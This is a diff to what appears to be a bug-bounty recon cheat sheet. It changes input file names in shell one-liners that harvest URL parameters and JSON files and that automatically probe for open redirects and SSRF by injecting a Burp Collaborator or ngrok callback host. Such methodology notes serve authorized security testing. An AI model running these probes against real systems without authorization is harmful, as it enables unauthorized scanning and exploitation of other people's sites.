@@ -47,7 +47,7 @@ for scope in $(cat subdomains.txt);do dig +short $scope | grep -o '[0-9]\{1,3\}\
 ```
 for scope in $(cat subdomains.txt);do paramspider -d $scope;done;cat output/* > parameters.txt;rm -r output
 
-cat subdomains.txt | waybackurls | sed -e 's/:80//' | grep "?[a-z0-9]*="
+cat domains.txt | waybackurls | sed -e 's/:80//' | grep "?[a-z0-9]*="
 ```
 
 ### Extract parameters from a list of subdomains (manually)
@@ -77,7 +77,7 @@ for scope in $(cat subdomains.txt);do curl "https://web.archive.org/cdx/search/c
 ### Extract json files
 
 ```
-cat subdomains.txt | waybackurls | grep "\\.json" | anew | tee -a json.txt
+cat domains.txt | waybackurls | grep "\\.json" | anew | tee -a json.txt
 ```
 
 ### Extract subdomains and capture the screen
@@ -119,14 +119,13 @@ for x in $(cat domains.txt | assetfinder -subs-only | httpx -silent);do echo "$x
 ### Automatic Open Redirect
 
 ```
-cat subdomains.txt | waybackurls | gf redirect | qsreplace <http://BURP SUITE COLLABORATOR OR NGROK> | httpx -silent -follow-redirects
-
+cat domains.txt | waybackurls | gf redirect | qsreplace <http://BURP SUITE COLLABORATOR OR NGROK> | httpx -silent -follow-redirects
 ```
 
 ### Automatic SSRF
 
 ```
-cat subdomains.txt | waybackurls | gf ssrf | qsreplace <http://BURP SUITE COLLABORATOR OR NGROK> | httpx -silent -follow-redirects
+cat domains.txt | waybackurls | gf ssrf | qsreplace <http://BURP SUITE COLLABORATOR OR NGROK> | httpx -silent -follow-redirects
 ```
 
 ### Verify Cross-Site Scripting (XSS)
